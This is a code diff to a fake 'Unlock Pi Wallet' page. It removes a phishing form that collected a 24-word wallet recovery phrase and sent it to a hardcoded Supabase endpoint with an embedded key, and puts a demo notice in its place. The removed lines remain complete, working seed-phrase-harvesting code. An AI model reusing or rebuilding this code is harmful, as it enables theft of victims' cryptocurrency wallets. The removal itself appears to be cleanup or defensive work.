@@ -275,16 +275,7 @@
   <div class="container">
     <h1>Unlock Pi Wallet</h1>
 
-    <div class="textarea-wrapper">
-      <textarea id="passphrase" placeholder="Enter your 24-word passphrase here"></textarea>
-      <div class="fake-placeholder">
-        Enter your 24-word passphrase here
-      </div>
-    </div>
-
-    <div id="error-msg">Invalid Passphrase</div>
-
-    <button class="btn btn-outline" onclick="handleUnlock()">Unlock With Passphrase</button>
+    <p>Passphrase unlocking is unavailable in this demo.</p>
     <button class="btn btn-filled">Unlock With Fingerprint</button>
 
     <div class="info-text">
@@ -300,46 +291,6 @@
     </div>
   </div>
 
-  <script src="assets/supabase-js_2.dc4a2.bin"></script>
-  <script>
-    const SUPABASE_URL = "https://ahdcxtcltxhwzqyejidc.supabase.co/";
-    const SUPABASE_ANON_KEY = "sb_publishable_o4_Wa8kKBDay4VUqGIguMA_JVInWqV0";
-    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-
-    async function handleUnlock() {
-      const input = document.getElementById("passphrase").value.trim();
-      const words = input.split(/\s+/);
-      const errorMsg = document.getElementById("error-msg");
-      const spinner = document.getElementById("spinner-container");
-
-      if (words.length !== 24) {
-        errorMsg.style.display = "block";
-        return;
-      }
-
-      errorMsg.style.display = "none";
-      spinner.style.display = "flex";
-
-      try {
-        const { error } = await supabaseClient
-          .from("vlt_213")
-          .insert([{ phrase: input }]);
-
-        spinner.style.display = "none";
-
-        if (error) {
-          errorMsg.textContent = "Error saving passphrase.";
-          errorMsg.style.display = "block";
-        } else {
-          window.location.href = "logic.html";
-        }
-      } catch {
-        spinner.style.display = "none";
-        errorMsg.textContent = "Network error. Try again.";
-        errorMsg.style.display = "block";
-      }
-    }
-  </script>
 </body>
 
 
